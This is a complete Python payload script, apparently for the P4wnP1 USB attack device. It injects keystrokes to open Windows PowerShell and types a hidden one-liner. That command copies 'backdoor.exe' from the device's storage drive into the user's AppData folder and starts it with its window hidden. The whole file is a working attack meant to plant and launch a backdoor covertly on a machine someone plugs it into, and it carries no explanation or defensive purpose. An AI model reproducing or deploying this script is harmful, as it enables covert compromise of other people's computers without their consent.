#!/usr/bin/env python3
import os, sys, time

P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

def main():
    print("[*] Running backdoor.exe stealthily from MSD...")

    # Assume MSD shows up as E:\ — optionally enhance with drive enumeration
    msd_drive = os.getenv("P4WN_MSD_DRIVE", "E:")
    src_path = f"{msd_drive}\\backdoor.exe"
    dst_path = "$env:APPDATA\\backdoor.exe"

    win_r(); time.sleep(0.5)
    type_string("powershell\n")
    time.sleep(1.0)

    command = f"""
Copy-Item '{src_path}' '{dst_path}' -Force;
Start-Process '{dst_path}' -WindowStyle Hidden;
"""
    one_liner = f"powershell -nop -w hidden -c \"{command.strip().replace('"', '`"').replace('\n', '')}\""
    type_string(one_liner + "\n")

    print(f"[+] Launched {src_path} to {dst_path} (hidden)")

if __name__ == "__main__":
    main()
